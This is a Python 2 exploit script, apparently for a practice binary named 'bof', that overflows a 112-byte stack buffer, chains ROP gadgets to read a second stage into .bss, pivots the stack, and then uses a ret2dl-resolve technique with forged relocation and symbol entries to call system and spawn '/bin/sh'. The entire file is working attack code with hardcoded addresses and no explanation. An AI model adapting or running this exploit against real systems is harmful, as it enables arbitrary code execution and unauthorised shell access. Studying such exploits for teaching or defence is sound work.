# test1.py
import sys
import struct
from subprocess import Popen, PIPE

bufsize = 112

addr_plt_read = 0x08048310   
addr_plt_write = 0x08048340  
addr_bss = 0x0804a018       

addr_pop3 = 0x080484cd       # pop esi ; pop edi ; pop ebp ; ret  ;
addr_pop_ebp = 0x080483d3    # pop ebp ; ret  ; 
addr_leave_ret = 0x08048401  # leave  ; ret  ; 

stack_size = 0x800
base_stage = addr_bss + stack_size

p = Popen(['./bof'], stdin=PIPE, stdout=PIPE)

buf = 'A' * bufsize
buf += struct.pack('<I', addr_plt_read)
buf += struct.pack('<I', addr_pop3)
buf += struct.pack('<I', 0)
buf += struct.pack('<I', base_stage)
buf += struct.pack('<I', 100)
buf += struct.pack('<I', addr_pop_ebp)
buf += struct.pack('<I', base_stage)
buf += struct.pack('<I', addr_leave_ret)

p.stdin.write(struct.pack('<I', len(buf)))
p.stdin.write(buf)
print "[+] read: %r" % p.stdout.read(len(buf))

cmd = '/bin/sh <&2 >&2'
addr_plt_start = 0x08048300
reloc_offset = 0x18
addr_relplt = 0x80482b0
reloc_offset = (base_stage+28) - addr_relplt
addr_got_write = 0x0804a00c
#r_info = 0x407

addr_dynsym = 0x80481cc
addr_dynstr = 0x804822c
addr_sym = base_stage + 36
# padding = 0x10 - ((addr_sym-addr_dynsym) & 0xF)
# addr_sym = addr_sym + padding
index_dynsym = (addr_sym - addr_dynsym) / 0x10
r_info = (index_dynsym << 8) | 0x7
st_name = (base_stage + 52) - addr_dynstr

buf = 'AAAA'
buf += struct.pack('<I', addr_plt_start)
buf += struct.pack('<I', reloc_offset)
buf += 'AAAA'
buf += struct.pack('<I', base_stage + 80)
buf += "AAAA"
buf += "AAAA"
buf += struct.pack('<I', addr_got_write)  # Elf32_Rel
buf += struct.pack('<I', r_info)
# buf += "A" * padding
buf += struct.pack('<I', st_name) # Elf32_Sym
buf += struct.pack('<I', 0)
buf += struct.pack('<I', 0)
buf += struct.pack('<I', 0x12)
buf += "system\x00"
buf += 'A' * (80-len(buf))
buf += cmd + '\x00'
buf += 'A' * (100-len(buf))

p.stdin.write(buf)
p.wait()